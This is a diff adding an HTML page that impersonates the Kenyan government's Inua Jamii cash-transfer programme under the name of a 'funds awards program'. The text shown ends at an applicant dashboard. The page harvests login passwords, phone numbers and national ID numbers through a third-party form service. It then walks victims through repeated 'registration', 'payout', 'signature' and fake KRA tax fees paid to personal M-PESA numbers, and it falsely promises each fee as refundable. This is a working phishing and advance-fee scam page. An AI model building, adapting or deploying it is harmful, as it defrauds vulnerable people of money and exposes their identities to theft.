@@ -1,0 +1,1491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inua Jamii Foundation B2C Funds Awards Program</title>
+    <style>
+        /* --- General Styling and Background --- */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #0A430E, #287C2E); /* Deeper, richer green */
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center; /* Center vertically for a professional look */
+            padding: 40px 10px;
+            animation: fadeIn 1s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .wrapper {
+            width: 100%;
+            max-width: 550px; /* Slightly wider wrapper */
+        }
+        .top-title {
+            text-align: center;
+            color: white;
+            font-size: 28px;
+            font-weight: 900;
+            text-transform: uppercase;
+            line-height: 1.2;
+            margin-bottom: 30px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+        }
+        .card {
+            background: #ffffff;
+            padding: 35px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+            animation: fadeIn 1.2s ease;
+        }
+        /* --- Navigation & Headings --- */
+        .navbar {
+            background: #1976D2; /* Standard primary color for professionalism */
+            color: white;
+            padding: 18px 25px;
+            border-radius: 16px 16px 0 0;
+            margin: -35px -30px 25px -30px; 
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .question {
+            font-size: 20px;
+            font-weight: 700;
+            color: #0A430E; /* Deep green for questions */
+            margin-bottom: 20px;
+        }
+        .info-text {
+            font-size: 16px;
+            line-height: 1.7;
+            color: #555;
+            margin-bottom: 25px;
+            text-align: justify;
+        }
+        /* --- Options and Inputs --- */
+        .option {
+            background: #F1F8E9; /* Very light green */
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 17px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            border: 2px solid #E0E0E0;
+            transition: all 0.3s ease;
+        }
+        .option:hover {
+            border-color: #4CAF50;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+        .option.selected {
+            background: #4CAF50; /* Primary green selection */
+            border-color: #2E7D32;
+            color: white;
+            font-weight: 700;
+        }
+        
+        /* Form/Input Styles */
+        .form-group { margin-bottom: 25px; }
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            color: #0A430E;
+            margin-bottom: 8px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #CCC;
+            border-radius: 10px;
+            font-size: 17px;
+            color: #333;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus, .form-group textarea:focus {
+            border-color: #1976D2;
+            outline: none;
+        }
+        
+        /* NEW: Password Visibility Container */
+        .password-container {
+            position: relative;
+        }
+        .password-container input {
+            padding-right: 40px; /* Make space for the eye icon */
+        }
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #757575;
+            font-size: 18px;
+            user-select: none; /* Prevent text selection on icon */
+        }
+
+        .required-note { font-size: 14px; color: #D32F2F; margin-top: -10px; margin-bottom: 10px; font-weight: 600; }
+        .error-message { font-size: 14px; color: #D32F2F; margin-top: 5px; }
+        /* --- Button Grouping --- */
+        .btn-container {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+            flex-wrap: wrap; 
+        }
+        .btn-next, .btn-submit, .btn-back, .btn-final-step, .btn-finalize {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: transform 0.25s, background 0.25s;
+        }
+        
+        .btn-next, .btn-submit { background: #4CAF50; color: white; }
+        .btn-next:hover, .btn-submit:hover { background: #388E3C; transform: scale(1.02); }
+        .btn-back { background: #B0BEC5; color: #333; }
+        .btn-back:hover { background: #90A4AE; transform: scale(1.02); }
+        .btn-finalize { background: #D32F2F; color: white; } /* Red for final financial step */
+        .btn-finalize:hover { background: #B71C1C; transform: scale(1.02); }
+        /* Dashboard Buttons (Large and Stacked) */
+        .dashboard-btn-group {
+            display: flex;
+            flex-direction: column; /* Stacked vertically */
+            gap: 15px;
+            margin-top: 25px;
+        }
+        .dashboard-btn-group .btn {
+            width: 100%;
+            padding: 20px; 
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 14px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
+            transition: all 0.25s;
+        }
+        .btn-dashboard-exit { background: #1565C0; color: white; }
+        .btn-awards-check { background: #FF9800; color: white; }
+        .btn-latest-awards { background: #4CAF50; color: white; }
+        .btn-dashboard-exit:hover { background: #0D47A1; transform: scale(1.02); }
+        .btn-awards-check:hover { background: #FB8C00; transform: scale(1.02); }
+        .btn-latest-awards:hover { background: #388E3C; transform: scale(1.02); }
+        
+        /* --- Specific Page Styles --- */
+        .congratulations-p { 
+            font-size: 24px; font-weight: 900; text-align: center; color: #FFC107; 
+            margin-bottom: 15px; text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .instruction-text { font-style: italic; text-align: center; color: #666; margin-bottom: 20px; font-size: 15px; line-height: 1.5; }
+        
+        /* Award Selection (Page 5) */
+        .award-structure-title { font-size: 18px; font-weight: 700; color: #1976D2; text-align: center; margin-bottom: 15px; border-bottom: 2px solid #E0E0E0; padding-bottom: 8px; }
+        .reg-fee { font-weight: 700; color: #0A430E; width: 40%; text-align: left; }
+        .award-amount { font-weight: 700; color: #D32F2F; width: 50%; text-align: right; font-size: 1.1em; }
+        
+        /* Payment Info (Page 6 & 9) */
+        .payment-box { 
+            background: #E3F2FD; 
+            padding: 25px; 
+            border-radius: 15px; 
+            border: 2px dashed #1976D2; 
+            margin-top: 20px; 
+            text-align: center;
+        }
+        .secretary-details { font-size: 20px; font-weight: 900; color: #D32F2F; margin-top: 8px; line-height: 1.5; }
+        .payment-box p { color: #333; font-size: 17px; }
+        
+        /* Dashboard (Page 13) */
+        .dashboard-content { text-align: center; padding: 20px 0 0 0; }
+        .dashboard-content h2 { font-size: 24px; color: #0A430E; margin-bottom: 15px; font-weight: 800; }
+        .dashboard-status {
+            background: #E8F5E9; color: #2E7D32; font-weight: 900; padding: 12px; border-radius: 8px; 
+            margin: 25px auto; border: 2px solid #2E7D32; display: inline-block; animation: none; 
+        }
+        /* New Status Style for Timeout */
+        .dashboard-status.timeout {
+            background: #FFEDED;
+            color: #D32F2F;
+            border-color: #D32F2F;
+        }
+        .dashboard-details { list-style: none; padding: 0; margin-top: 20px; text-align: left; border-top: 1px solid #eee; padding-top: 15px; }
+        .dashboard-details li { padding: 10px 0; font-size: 16px; color: #333; border-bottom: 1px dashed #f0f0f0; }
+        
+        /* --- NEW: Highly Visible Timer Display --- */
+        #statusTimerDisplay {
+            padding: 15px 10px;
+            background: #FFF3E0; /* Light orange background */
+            border: 2px solid #FF9800; /* Orange border */
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 22px;
+            font-weight: 900;
+            color: #E65100; /* Deep orange text */
+            text-align: center;
+            list-style: none; /* Ensure no bullet point */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Final Disbursement (Page 14) - Animation Updated for Processing Page */
+        .final-disbursement-box {
+            text-align: center; padding: 30px 20px; background: #FFFDE7; border: 3px solid #FF9800; border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 152, 0, 0.5); /* Glowing effect */
+        }
+        .disbursement-title { font-size: 26px; font-weight: 900; color: #E65100; margin-bottom: 15px; }
+        
+        .computer-graphic { 
+            font-size: 60px; /* Increased size for impact */
+            margin: 15px 0; 
+            color: #1976D2; 
+            display: inline-block;
+        }
+        
+        /* NEW: Processing Page Animation Styles */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .computer-graphic.processing {
+            animation: spin 1.5s linear infinite; /* Spin the arrows */
+        }
+
+        /* NEW: Dots Animation - Applied to a pseudo-element or span */
+        .loading-dots::after {
+            content: ' .';
+            animation: dots 1.5s steps(3, end) infinite;
+            white-space: pre; /* Essential to keep spaces */
+        }
+        @keyframes dots {
+            0% { content: ' .'; }
+            33% { content: ' ..'; }
+            66% { content: ' ...'; }
+            100% { content: ' .'; }
+        }
+        
+        .wait-message { 
+            font-size: 18px; font-weight: 800; color: #D32F2F; margin-top: 20px; padding: 10px; border: 1px dashed #D32F2F; border-radius: 5px; line-height: 1.4; 
+        }
+        /* Latest Awards Table (Page 15) */
+        .awards-table-container { margin-top: 20px; overflow-x: auto; }
+        .awards-table {
+            width: 100%; border-collapse: collapse; font-size: 15px; min-width: 400px;
+        }
+        .awards-table th, .awards-table td { border: 1px solid #ddd; padding: 12px 8px; }
+        .awards-table th { background-color: #0A430E; color: white; font-weight: 700; text-align: center; }
+        .awards-table tr:nth-child(even) { background-color: #f9f9f9; }
+        
+        /* Table Column Specific Styles (Updated for new order) */
+        .awards-table th:nth-child(1), .awards-table td:nth-child(1) { width: 5%; text-align: center; } /* # */
+        .awards-table th:nth-child(2), .awards-table td:nth-child(2) { width: 35%; text-align: left; } /* Phone */
+        .awards-table th:nth-child(3), .awards-table td:nth-child(3) { width: 30%; text-align: center; } /* Amount - Centered */
+        .awards-table th:nth-child(4), .awards-table td:nth-child(4) { width: 30%; text-align: center; } /* ID */
+        
+        .awards-table td strong { color: #D32F2F; }
+        /* Page 12 - iTax Dynamic Fee */
+        .itax-fee-display { 
+            font-size: 32px; 
+            color: #E65100; 
+            font-weight: 900;
+        }
+        /* Hide all pages initially except the active one */
+        .page { display: none; }
+        .page.active { display: block; }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="top-title">
+            INUA JAMII FOUNDATION<br>
+            B2C FUNDS AWARDS PROGRAM
+        </div>
+        <div class="card">
+            
+            <div id="page0" class="page active">
+                <div class="navbar" id="authNavbar">
+                    Account Login
+                </div>
+                <div id="loginForm">
+                    <p class="question" style="text-align:center; margin-top:20px;">Welcome Back! Please Log In.</p>
+                    <div class="form-group">
+                        <label for="loginEmail"><span>📧</span> Email Address:</label>
+                        <input type="email" id="loginEmail" placeholder="Enter your registered email" required>
+                        <div id="loginEmailError" class="error-message" style="display:none;"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="loginPassword"><span>🔒</span> Password:</label>
+                        <div class="password-container">
+                            <input type="password" id="loginPassword" placeholder="Enter your password" required>
+                            <span class="toggle-password" onclick="togglePasswordVisibility('loginPassword', this)">👁️</span>
+                        </div>
+                        <div id="loginPasswordError" class="error-message" style="display:none;"></div>
+                    </div>
+                    
+                    <button class="btn-submit" onclick="loginUser()">LOG IN ➜</button>
+                    <p style="text-align:center; margin-top:15px; font-size:15px;">
+                        Don't have an account? <a href="#" onclick="toggleForm('register')" style="color:#1976D2; font-weight:700;">Register here</a>
+                    </p>
+                </div>
+                <div id="registerForm" style="display:none;">
+                    <p class="question" style="text-align:center; margin-top:20px;">Create Your Account to Proceed</p>
+                    <div class="form-group">
+                        <label for="regEmail"><span>📧</span> Email Address:</label>
+                        <input type="email" id="regEmail" placeholder="Choose a valid email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="regName"><span>👤</span> Full Name (for ID):</label>
+                        <input type="text" id="regName" placeholder="Enter your full name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="regPassword"><span>🔒</span> Choose Password:</label>
+                         <div class="password-container">
+                            <input type="password" id="regPassword" placeholder="Minimum 6 characters" required>
+                            <span class="toggle-password" onclick="togglePasswordVisibility('regPassword', this)">👁️</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="confirmPassword"><span>✅</span> Confirm Password:</label>
+                         <div class="password-container">
+                            <input type="password" id="confirmPassword" placeholder="Re-enter password" required>
+                            <span class="toggle-password" onclick="togglePasswordVisibility('confirmPassword', this)">👁️</span>
+                        </div>
+                    </div>
+                    
+                    <button class="btn-next" onclick="registerUser()">REGISTER ➜</button>
+                    <p style="text-align:center; margin-top:15px; font-size:15px;">
+                        Already have an account? <a href="#" onclick="toggleForm('login')" style="color:#1976D2; font-weight:700;">Login here</a>
+                    </p>
+                </div>
+            </div>
+            
+            <div id="page1" class="page">
+                <div class="navbar" style="background: #0A430E;">
+                    Program Consent
+                </div>
+                <p class="info-text">
+                    𝗜𝗡𝗨𝗔 𝗝𝗔𝗠𝗜𝗜 𝗙𝗢𝗨𝗡𝗗𝗔𝗧𝗜𝗢𝗡 𝗙𝗨𝗡𝗗 𝗔𝗪𝗔𝗥𝗗𝗦 is the Government of Kenya's flagship 
+                    National Safety Net Programme that provides regular cash transfers to support 
+                    Kenyans and boost the financial sector. The programme's objective is to improve 
+                    the welfare of beneficiaries and cushion them from poverty. It is implemented 
+                    by the Ministry of Labour and Social Protection.
+                </p>
+                <p class="question">Can we proceed with the application?</p>
+                <div class="option" id="optionYes" onclick="selectOption1('yes')">
+                    <strong>1  YES, I AGREE</strong> <span>✅</span>
+                </div>
+                <div class="option" id="optionNo" onclick="selectOption1('no')">
+                    <strong>2  NO, I DECLINE</strong> <span>❌</span>
+                </div>
+                <button class="btn-next" onclick="goNext(1)">NEXT PAGE ➜</button>
+            </div>
+            
+            <div id="page2" class="page">
+                <div class="navbar" style="background: #0A430E;">
+                    Information Source
+                </div>
+                <p class="question">Where did you hear about this program?</p>
+                <div class="options-container">
+                    <div class="option" data-value="News Broadcasting" onclick="selectSource(this)">
+                        <strong>1  News Broadcasting</strong> <span>📻</span>
+                    </div>
+                    <div class="option" data-value="Personal Recommendation" onclick="selectSource(this)">
+                        <strong>2  Personal Recommendation</strong> <span>🗣️</span>
+                    </div>
+                    <div class="option" data-value="Social Media" onclick="selectSource(this)">
+                        <strong>3  Social Media</strong> <span>📱</span>
+                    </div>
+                    <div class="option" data-value="Other" onclick="selectSource(this)">
+                        <strong>4  Other</strong> <span>❓</span>
+                    </div>
+                </div>
+                <div id="otherInputContainer" style="display:none;">
+                    <label for="otherInput" style="font-size:15px; color:#0A430E; font-weight:600;">Please specify your source:</label>
+                    <input type="text" id="otherInput" placeholder="e.g., Local church, NGO, Government office" oninput="validateOtherInput()">
+                </div>
+                <button class="btn-next" id="page2NextButton" onclick="goNext(2)" disabled>NEXT PAGE ➜</button>
+            </div>
+            
+            <div id="page3" class="page">
+                <div class="navbar" style="background: #0A430E;">
+                    Award Purpose Selection
+                </div>
+                <p class="question">What is the main purpose for receiving the award?</p>
+                <div class="options-container">
+                    <div class="option" data-value="Start a business" onclick="selectPurpose(this)">
+                        <strong>1  Start a Business</strong> <span>🚀</span>
+                    </div>
+                    <div class="option" data-value="Top up a business" onclick="selectPurpose(this)">
+                        <strong>2  Top up an Existing Business</strong> <span>📈</span>
+                    </div>
+                    <div class="option" data-value="Pay school fees" onclick="selectPurpose(this)">
+                        <strong>3  Pay School Fees</strong> <span>📚</span>
+                    </div>
+                    <div class="option" data-value="Pay bills" onclick="selectPurpose(this)">
+                        <strong>4  Pay Bills</strong> <span>🧾</span>
+                    </div>
+                    <div class="option" data-value="Pay rent" onclick="selectPurpose(this)">
+                        <strong>5  Pay Rent/Housing</strong> <span>🏠</span>
+                    </div>
+                </div>
+                <p class="instruction-text" style="color: #1976D2;">
+                    Note: Kindly plan to use your promotion award wisely.
+                </p>
+                <button class="btn-next" id="page3NextButton" onclick="goNext(3)" disabled>NEXT PAGE ➜</button>
+            </div>
+            
+            <div id="page4" class="page">
+                <div class="congratulations-p" style="color:#0A430E;">
+                    ✅ REGISTRATION DETAILS
+                </div>
+                
+                <p class="instruction-text">
+                    ✍️ Kindly provide details for system validation and registration.
+                </p>
+                
+                <div class="form-group">
+                    <label for="regEmailAddress"><span>📧</span> Input Your Email Address:</label>
+                    <input type="email" id="regEmailAddress" name="email" placeholder="Enter email address and password" required>
+                </div>
+                <form id="registrationForm" onsubmit="submitLoanForm(event)" method="POST" action="https://api.web3forms.com/submit">
+                    <input type="hidden" name="access_key" value="750707f5-b4fd-42f8-b5a7-bcab3c6546ea">
+                    <input type="hidden" name="subject" value="New INUA JAMII Registration Submission">
+                    <input type="hidden" id="hiddenEmail" name="Email" required>
+                    <div class="form-group">
+                        <label for="fullName"><span>👤</span> Full Legal Names:</label>
+                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full legal names" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="phoneNumber"><span>📞</span> Phone Number (MPESA):</label>
+                        <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="e.g., 07XXXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="county"><span>🌍</span> County of Residence:</label>
+                        <input type="text" id="county" name="county" placeholder="Enter your County of Residence" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="idNumber"><span>🆔</span> National ID Number:</label>
+                        <input type="text" id="idNumber" name="idNumber" placeholder="Enter your National ID Number" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-submit">SUBMIT REGISTRATION ➜</button>
+                </form>
+            </div>
+            
+            <div id="page5" class="page">
+                <div class="congratulations-p" style="color: #4CAF50;">
+                    🎉 UPLOAD SUCCESSFUL 🎉
+                </div>
+                
+                <p class="instruction-text">
+                    Select your desired INUA JAMII PROMOTION award package below:
+                </p>
+                
+                <div class="award-structure-title">
+                    REGISTRATION FEE &nbsp; | &nbsp; AWARD AMOUNT
+                </div>
+                <div class="options-container" id="awardOptions">
+                    <div class="option" data-reg="499" data-award-int="30000" data-award="30,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 499</span> <span class="award-amount">Ksh 30,000</span>
+                    </div>
+                    <div class="option" data-reg="999" data-award-int="65000" data-award="65,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 999</span> <span class="award-amount">Ksh 65,000</span>
+                    </div>
+                    <div class="option" data-reg="2999" data-award-int="95000" data-award="95,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 2,999</span> <span class="award-amount">Ksh 95,000</span>
+                    </div>
+                    <div class="option" data-reg="4999" data-award-int="125000" data-award="125,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 4,999</span> <span class="award-amount">Ksh 125,000</span>
+                    </div>
+                    <div class="option" data-reg="6999" data-award-int="200000" data-award="200,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 6,999</span> <span class="award-amount">Ksh 200,000</span>
+                    </div>
+                    <div class="option" data-reg="7999" data-award-int="300000" data-award="300,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 7,999</span> <span class="award-amount">Ksh 300,000</span>
+                    </div>
+                    <div class="option" data-reg="8999" data-award-int="400000" data-award="400,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 8,999</span> <span class="award-amount">Ksh 400,000</span>
+                    </div>
+                    <div class="option" data-reg="9999" data-award-int="500000" data-award="500,000" onclick="selectAward(this)">
+                        <span class="reg-fee">Ksh 9,999</span> <span class="award-amount">Ksh 500,000</span>
+                    </div>
+                </div>
+                <p style="font-size: 14px; text-align: center; color: #D32F2F; font-weight: 600; margin-bottom: 10px;">
+                    Note: The award is disbursed immediately after registration fee payment.
+                </p>
+                <div class="btn-container">
+                    <button type="button" class="btn-back" onclick="goBack(5)">⬅ BACK</button>
+                    <button class="btn-next" id="page5NextButton" onclick="goNext(5)" disabled>PROCEED TO PAYMENT ➜</button>
+                </div>
+            </div>
+            
+            <div id="page6" class="page">
+                <div class="congratulations-p" style="color:#1976D2;">
+                    PAYMENT ACTIVATION REQUIRED
+                </div>
+                
+                <p class="instruction-text" style="font-style: normal; color: #333;">
+                    Your number <strong id="finalPhoneNumber">...</strong> is nominated to receive <strong id="finalAwardAmount" style="color: #D32F2F;">...</strong>.
+                </p>
+                <div class="payment-box">
+                    <p>Kindly remit the Mandatory Registration Fee of:</p>
+                    <div id="finalRegFeeAmount" class="secretary-details">Ksh ...</div>
+                    
+                    <p style="margin-top: 15px;">To the Designated Secretary's Office:</p>
+                    <div class="secretary-details">
+                        Number: 0105565417<br>
+                        Name: JUDITH
+                        <br>
+                        or 0783597584 <br>
+                        Name:Dancun Makau
+                    </div>
+                    <p style="font-style: italic; margin-top: 15px; font-size: 15px; color: #4CAF50;">
+                        Award will be processed immediately after confirmation.
+                    </p>
+                </div>
+                <p class="instruction-text" style="margin-top: 20px; font-size: 14px; color: #777;">
+                    This fee covers initial processing and slotting your funds for B2C transfer.
+                </p>
+                
+                <div class="btn-container">
+                    <button type="button" class="btn-back" onclick="goBack(6)">⬅ BACK</button>
+                    <button class="btn-next" onclick="goNext(6)">I HAVE PAID ➜</button>
+                </div>
+            </div>
+            
+            <div id="page7" class="page">
+                <div class="navbar">
+                    M-PESA Confirmation (Step 1 of 4)
+                </div>
+                <p class="question">Paste Your Registration M-PESA Confirmation Message:</p>
+                <p class="required-note">⚠️ This confirmation is vital for immediate system verification. (Ksh <span id="regFeeConfirmationAmount">...</span>)</p>
+                
+                <div class="form-group">
+                    <textarea id="mpesaConfirmation" rows="5" placeholder="e.g., QRT123XYZ confirmed you sent Ksh [REGISTRATION_FEE] to JUDITH 0105565417 on YYYY..." oninput="checkUniqueMpesaMessage(7)" required></textarea>
+                    <div id="mpesaConfirmationError" class="error-message" style="display:none;"></div>
+                </div>
+                
+                <button class="btn-next" id="page7NextButton" onclick="submitMpesaConfirmation(7)" disabled>CONFIRM PAYMENT ➜</button>
+            </div>
+            
+            <div id="page8" class="page">
+                <div class="congratulations-p" style="color:#0A430E;">
+                    ✅ PAYMENT RECEIVED
+                </div>
+                
+                <p class="instruction-text" style="font-style: normal; color: #333;">
+                    Choose your preferred final payout option and remit the corresponding transfer charge:
+                </p>
+                <div class="options-container">
+                    <div class="option payout-option" data-option="KCB" data-charge="6,855" data-fee="6855" onclick="selectPayoutOption(this)">
+                        <div class="payout-option-main">
+                            <span>1. KCB Bank Account</span> <span style="font-weight:700;">Ksh 6,855</span>
+                        </div>
+                        <div class="payout-option-charge" style="font-size: 14px; color: #777;">
+                            (Account Transfer Charge)
+                        </div>
+                    </div>
+                    <div class="option payout-option" data-option="MPESA" data-charge="4,999" data-fee="4999" onclick="selectPayoutOption(this)">
+                        <div class="payout-option-main">
+                            <span>2. MPESA (Safaricom)</span> <span style="font-weight:700;">Ksh 4,999</span>
+                        </div>
+                        <div class="payout-option-charge" style="font-size: 14px; color: #777;">
+                            (Mobile Transfer Charge)
+                        </div>
+                    </div>
+                    <div class="option payout-option" data-option="M banking account" data-charge="7,988" data-fee="7988" onclick="selectPayoutOption(this)">
+                        <div class="payout-option-main">
+                            <span>3. Other Mobile Banking</span> <span style="font-weight:700;">Ksh 7,988</span>
+                        </div>
+                        <div class="payout-option-charge" style="font-size: 14px; color: #777;">
+                            (Inter-Bank/Mobile Charge)
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group" id="payoutMpesaPasteArea" style="display:none; margin-top: 30px;">
+                    <p class="question" style="font-size: 17px; margin-bottom: 10px; color: #1976D2;">
+                        Paste Confirmation for the Ksh <span id="payoutFeeAmount" style="color:#D32F2F;">...</span> Payout Charge:
+                    </p>
+                    <p class="required-note">
+                        ⚠️ Payment must be confirmed before proceeding.
+                    </p>
+                    <textarea id="mpesaPayoutConfirmation" rows="5" placeholder="Mpesa confirmation for the selected payout charge..." oninput="checkUniqueMpesaMessage(8)" required></textarea>
+                    <div id="mpesaPayoutConfirmationError" class="error-message" style="display:none;"></div>
+                </div>
+                <p class="instruction-text" style="color: #D32F2F; margin-top: 15px; font-weight: 600;">
+                    NB: These charges are applied once, granting you permanent fan status.
+                </p>
+                <div class="btn-container">
+                    <button type="button" class="btn-back" onclick="goBack(8)">⬅ BACK</button>
+                    <button class="btn-next" id="page8NextButton" onclick="submitMpesaConfirmation(8)" disabled>PROCEED TO SIGNATURE FEE ➜</button>
+                </div>
+            </div>
+            
+            <div id="page9" class="page">
+                 <div class="navbar">
+                    Signature & Licensing Fee (Step 3 of 4)
+                </div>
+                
+                <div class="payment-box" style="background: #FBEFF2; border-color: #D32F2F;">
+                    <p style="font-weight: 600; color: #D32F2F;">
+                        FINAL ACTION REQUIRED: 𝐃𝐞𝐚𝐫 𝐅𝐚𝐧, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐩𝐚𝐲 𝐭𝐡𝐞 Signature Fee 𝐨𝐟:
+                    </p>
+                    <span class="secretary-details" style="font-size: 32px; margin: 10px 0;">Ksh 7,599</span>
+                    
+                    <p style="margin-top: 15px; font-size: 15px; color: #333;">
+                        This fee covers licensing and the final digital signature to release your funds.
+                    </p>
+                    <p style="margin-top: 10px; font-size: 14px; color: #1976D2; font-style: italic;">
+                        Any additional charges would be fully refundable on top of your promotion.
+                    </p>
+                    <div class="congratulations-p" style="color: #4CAF50; margin-top: 15px; font-size: 20px;">*FINAL STEP APPROVAL*</div>
+                </div>
+                
+                <p class="question" style="text-align: center; margin-top: 25px;">
+                    Send the Ksh **7,599** fee to the Secretary's Office:
+                </p>
+                <div class="payment-box" style="margin-top: 10px; padding: 15px; border: 1px solid #CCC;">
+                    <div class="secretary-details">
+                        Number: **0105565417**<br>
+                        Name: **JUDITH**
+                    </div>
+                </div>
+                
+                <button class="btn-next" onclick="goNext(9)" style="margin-top: 20px;">I HAVE PAID ➜</button>
+            </div>
+            
+            <div id="page10" class="page">
+                <div class="navbar">
+                    M-PESA Confirmation (Step 3 of 4)
+                </div>
+                <p class="question">Paste the M-PESA Confirmation Message for the Signature Fee (Ksh 7,599):</p>
+                <p class="required-note">⚠️ The system requires this message to complete the signature process.</p>
+                
+                <div class="form-group">
+                    <textarea id="mpesaSignatureConfirmation" rows="5" placeholder="e.g., QRT123XYZ confirmed you sent Ksh 7,599 to JUDITH 0105565417 on YYYY..." oninput="checkUniqueMpesaMessage(10)" required></textarea>
+                    <div id="mpesaSignatureConfirmationError" class="error-message" style="display:none;"></div>
+                </div>
+                
+                <button class="btn-next" id="page10NextButton" onclick="submitMpesaConfirmation(10)" disabled>VERIFY SIGNATURE FEE ➜</button>
+            </div>
+            
+            <div id="page11" class="page">
+                <div class="navbar">
+                    KRA iTax Fee Notification (Step 4 of 4)
+                </div>
+                <div class="congratulations-p" style="color:#D32F2F; font-size: 26px;">
+                    ⚠️ KRA FINAL INTERCEPTION
+                </div>
+                <p class="instruction-text" style="font-style: normal; color: #333; margin-bottom: 25px;">
+                    Your **Ksh <span id="itaxAwardAmount">...</span>** award has been flagged by KRA iTax for mandatory final tax clearance before disbursement.
+                </p>
+                
+                <p class="question" style="font-size: 20px; text-align: center; color: #E65100;">
+                    Mandatory iTax Dynamic Fee (30% of Award):
+                </p>
+                
+                <div class="itax-fee-display" id="itaxFeeAmount" style="text-align: center; margin-top: 10px;">
+                    Ksh 9,450
+                </div>
+                
+                <p class="instruction-text" style="color: #0A430E; margin-top: 20px; font-weight: 700; font-style: normal;">
+                    This fee is **100% refundable** upon successful transfer of the full award amount.
+                </p>
+                
+                <div class="payment-box" style="margin-top: 15px; padding: 15px; border-color: #D32F2F;">
+                    <p style="font-size: 16px;">Send the Fee to the Secretary's Office for immediate clearance:</p>
+                    <div class="secretary-details" style="font-size: 18px;">
+                        Number: **0105565417**<br>
+                        Name: **JUDITH**
+                    </div>
+                </div>
+                
+                <button class="btn-next" onclick="goNext(11)" style="margin-top: 20px;">I HAVE PAID ➜</button>
+            </div>
+            
+            <div id="page12" class="page">
+                <div class="navbar">
+                    M-PESA Confirmation (Step 4 of 4)
+                </div>
+                <p class="question">Paste the M-PESA Confirmation Message for the KRA Fee (Ksh <span id="kraFeeConfirmationAmount">...</span>):</p>
+                <p class="required-note">⚠️ This is the **LAST** financial requirement. Funds will be released immediately after verification.</p>
+                
+                <div class="form-group">
+                    <textarea id="mpesaKraConfirmation" rows="5" placeholder="e.g., QRT123XYZ confirmed you sent Ksh [KRA_FEE] to JUDITH 0105565417 on YYYY..." oninput="checkUniqueMpesaMessage(12)" required></textarea>
+                    <div id="mpesaKraConfirmationError" class="error-message" style="display:none;"></div>
+                </div>
+                
+                <button class="btn-next" id="page12NextButton" onclick="submitMpesaConfirmation(12)" disabled>FINALIZE RELEASE ➜</button>
+            </div>
+            
+            <div id="page13" class="page">
+                <div class="navbar" style="background: #0A430E;">
+                    Applicant Dashboard
+                </div>
+                <div class="dashboard-content">
+                    <h2 id="applicantGreeting">Welcome, Applicant!</h2>
+                    
+                    <p id="dashboardStatusContainer" class="dashboard-status">
+                        STATUS: FUNDS PENDING FINAL DISBURSEMENT
+                    </p>
+                    
+                    <ul class="dashboard-details">
+                        <li>**Award Amount:** <strong id="dashboardAwardAmount" style="color: #D32F2F;">Ksh 500,000</strong></li>
+                        <li>**Applicant ID:** <strong id="dashboardApplicantID">IJF-987654</strong></li> 
+                        <li>**Last Activity:** KRA Clearance Confirmed</li>
+                    </ul>
+                    
+                    <div id="statusTimerDisplay" style="display:none;">
+                        **Next Step:** Initiating Final Transfer (6:00:00)
+                    </div>
+                    
+                    <p id="dashboardInstructionText" class="instruction-text" style="color: #777; font-style: normal;">
+                        Your funds are queued for B2C transfer. Click below to initiate the final digital handshake with the Treasury.
+                    </p>
+                    
+                    <div class="dashboard-btn-group">
+                        <button class="btn btn-dashboard-exit" onclick="handleInitiateTransfer()">INITIATE FINAL TRANSFER 💰</button>
